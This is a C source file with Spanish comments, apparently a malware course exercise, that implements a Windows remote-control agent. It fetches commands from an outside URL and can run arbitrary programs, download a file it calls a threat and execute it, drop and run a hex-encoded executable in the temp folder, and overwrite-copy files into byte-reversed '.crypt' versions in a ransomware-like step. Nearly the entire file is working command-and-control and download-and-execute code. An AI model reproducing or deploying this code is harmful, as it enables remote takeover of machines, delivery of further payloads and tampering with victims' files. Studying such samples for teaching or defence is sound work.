// Herramientas -> Opciones de Compilación -> Añadir estos comandos a la línea de comandos del linker
// -lwininet

#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<wininet.h>
#include<string.h>

//Ejercicio 1: Ejecuta una aplicación
 void execute(char * ruta){
    system(ruta);
}
    
//Ejercicio 2: Sale de la aplicación actual
void salir(){
    exit(0);
}

//Ejercicio 3: Descarga una amenaza y la ejecuta
void downloadURL(char* amenaza){
    char * file = "descarga.txt";
    HRESULT returnValue;
	// Function prototype, URLMON.URLDownloadToFileA
    typedef HRESULT(WINAPI *tURLDownloadToFileA)(LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, void *lpfnCB);
    tURLDownloadToFileA pURLDownloadToFileA;
	// Get address of the function from the specified dynamic-link library
    pURLDownloadToFileA = (tURLDownloadToFileA)GetProcAddress(LoadLibraryA("urlmon.dll"), "URLDownloadToFileA");
	// CALL URLDownloadToFileA
    returnValue = pURLDownloadToFileA(0, amenaza, file, 0, 0);
    
    execute(file);
    // Return code
    if(returnValue == S_OK){
        printf("The download started successfully");
    }
    else if(returnValue == E_OUTOFMEMORY){
        printf("The buffer length is invalid, or there is insufficient memory to complete the operation");
    }
	//else if(returnValue == INET_E_DOWNLOAD_FAILURE){
    //    printf("The specified resource or callback interface was invalid");
    //}
    else{
        printf("File download failed");
    }    
}

//Obtiene los caracteres hexadecimales de una cadena de caracteres en código ASCII
int * getHexadecimales(char* hexad){
    int* hexas = malloc(sizeof(int)*strlen(hexad));
    char entrada[2];
        entrada[0] = hexad[0];
        entrada[1] = hexad[1];
        
        int a=0;
        int b=1;
        int i;
        for(i=0; i<strlen(hexad); i++){
            a = a + 2;
            b = b + 2;
             sscanf(entrada,"%2x",&hexas[i]);
             entrada[0] = hexad[a];
            entrada[1] = hexad[b];
        }
        
        return hexas;
}

//Ejercicio 4: Crea el binario a partir de la secuencia en hexadecimal
void createFile(char* hexa){    
    int * hexas = getHexadecimales(hexa);
    
    char buff[255];
    GetTempPathA(250,buff);
    strcat(buff,"aplicacion.exe");
    
   FILE *fp;
   int ch;
    fp = fopen(buff, "wb");
   for(ch=0; ch<strlen(hexa); ch++){
        putc(hexas[ch],fp);
    }
   fclose(fp);
   
   execute(buff);
}

//Ejercicio 5: Regresa una encriptación del archivo en la ruta especificada
void reverse(char * ruta){
    FILE * ptr;
    char * buffer;
    int i = 0;
    char ch;
    ptr = fopen(ruta,"rb");
    
    fseek(ptr, 0, SEEK_END);
    long tamano = ftell(ptr);
    
    rewind(ptr);
    
    buffer = (char*)malloc(sizeof(char)*tamano);
    
     while(!feof(ptr))
     {
	   ch=getc(ptr);
   	    buffer[i] = ch;
	   i++;
    }
    
    fclose(ptr);
    
    int j;
    
    FILE * fileW;
    
    fileW = fopen(strcat(ruta,".crypt"), "wb");
    
    if(fileW == NULL){
        printf("Error creating file");
    }
    
    size_t n =(sizeof(char)*tamano)/sizeof(buffer[0]);

    for(j = n-1; j>=0; j--){
        fwrite(&buffer[j],sizeof(buffer[j]), 1, fileW);
    }
    
    fclose(fileW);
    
    
    free(buffer);
}
 
//Programa principal
int main(){
	// Parameters in the function prototype
    HINTERNET hInternetOpenSession, hFile;
	char lpBuffer[65536];
    DWORD numberOfBytesRead;
    int flag = 0;
	// InternetOpen
    hInternetOpenSession = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0); // Type of access required
    if(hInternetOpenSession == NULL){
        printf("InternetOpen failed\n");
    }
	// InternetOpenUrl
    hFile = InternetOpenUrl(hInternetOpenSession, "http://www.paesalcala.net/alma.log", 0, 0, INTERNET_NO_CALLBACK | INTERNET_FLAG_DONT_CACHE, 0);
    if(hFile == NULL){
        printf("InternetOpenUrl failed\n");
    }
    char response[65536];
	// InternetReadFile
    while(!flag){
        if(InternetReadFile(hFile, lpBuffer, sizeof(lpBuffer), &numberOfBytesRead)){
            if(numberOfBytesRead > 0){
				memcpy(response,lpBuffer,numberOfBytesRead);
				char* command = strtok(response, " "); 
                char* param = strtok(NULL, " ");
                int path;

                if (strcmp(command,"exec") == 0){
                    execute(param);
                }
                else if (strcmp(command,"exit") == 0){
                    salir();
                }
                else if(strcmp(command,"urldownload") == 0){
                    downloadURL(param);
                }
                else if(strcmp(command,"file") == 0){
                    createFile(param);    
                }
                else if(strcmp(command,"reversetransposition") == 0){
                    reverse(param);
                }
            }
            else{
                flag = 1;
            }
        }
        else{
            printf("InternetReadFile failed\n");
            flag = 1;
        }
    }
    InternetCloseHandle(hInternetOpenSession);
    InternetCloseHandle(hFile);
    return 0;
}

// DOWNLOADING A WEB PAGE IN C USING WININET
// http://www.martinbroadhurst.com/downloading-a-web-page-in-c-using-wininet.html

// Downloading data via WinInet
// https://stackoverflow.com/questions/47486240/downloading-data-via-wininet
 
